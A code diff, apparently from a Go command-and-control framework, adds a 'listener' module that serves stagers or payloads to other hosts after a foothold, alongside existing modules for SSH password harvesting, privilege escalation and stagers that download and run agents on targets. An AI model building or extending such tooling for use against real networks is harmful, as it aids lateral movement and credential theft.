@@ -93,6 +93,7 @@ const (
 	ModBring2CC     = "bring2cc"
 	ModGDB          = "gdbserver"
 	ModStager       = "stager"
+	ModListener     = "listener"
 	ModSSHHarvester = "ssh_harvester"
 )
 
@@ -125,6 +126,7 @@ var ModuleComments = map[string]string{
 	ModGDB:          "Remote gdbserver, debug anything",
 	ModStager:       "Generate a stager for staged payload delivering (BAD OPSEC, please use custom stagers with shellcode agent in Windows and shared library in Linux)",
 	ModSSHHarvester: "Harvest clear-text password automatically from OpenSSH server process",
+	ModListener:     "Start a listener to serve stagers or regular files, useful when you have a foothold on a machine and want to deliver a payload to other targets in the same network",
 }
 
 // Module help for options, does not include every module since not all modules need args
@@ -182,6 +184,11 @@ var ModuleHelp = map[string]map[string]string{
 		"type":       "Stager format, eg. bash script",
 		"agent_path": "Path to the agent binary that will be downloaded and executed on target hosts",
 	},
+	ModListener: {
+		"payload":  "The payload to serve, eg. ./stager",
+		"listener": "Listener type, eg. http_bare, http_aes_deflate",
+		"port":     "Port to listen on, eg. 8080",
+	},
 }
 
 // C2Commands
@@ -201,6 +208,7 @@ const (
 	C2CmdLPE           = "!lpe"
 	C2CmdBring2CC      = "!" + ModBring2CC
 	C2CmdStat          = "!stat"
+	C2CmdListener      = "!listener"
 )
 
 // AgentSystemInfo agent properties
